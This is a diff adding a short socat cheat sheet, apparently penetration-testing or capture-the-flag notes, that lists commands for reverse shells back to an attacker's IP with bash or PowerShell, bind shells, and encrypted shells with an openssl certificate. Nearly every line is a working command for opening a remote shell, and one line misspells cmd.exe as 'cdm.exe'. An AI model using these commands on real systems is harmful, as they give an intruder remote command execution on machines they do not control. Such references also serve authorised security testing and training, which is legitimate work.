@@ -1,0 +1,38 @@
+SOCAT.
+
+
+
+REVERSE SHELL.
+Syntax:
+socat TCP-L: <port> -
+Connect back (windows):
+socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:powershell.exe,pipes
+Connect back (linux):
+socat TCP:<LOCAL_IP>:<LOCAL_PORT> EXEC:"bash -li"
+
+
+
+BIND SHELL.
+Syntax (linux):
+socat TCP-L:<PORT> EXEC:"bash -li"
+Syntax (windows):
+socat TCP-L:<PORT> EXEC:powershell.exe, pipes
+Connect to listener (linux/windows):
+socat TCP:<TARGET_IP>:<TARGET_PORT> -
+
+
+
+ENCRYPTED SHELL.
+Certificate generation (attacking machine):
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+Generation creates 2 files. Need to be merged:
+cat shell.key shell.crt > shell.pem
+Reverse listener:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+Connect back:
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+
+On target:
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cdm.exe,pipes
+On attacker:
+socat OPENSSL:<TARGET_IP>:<TARGET_PORT>,verify=0 -
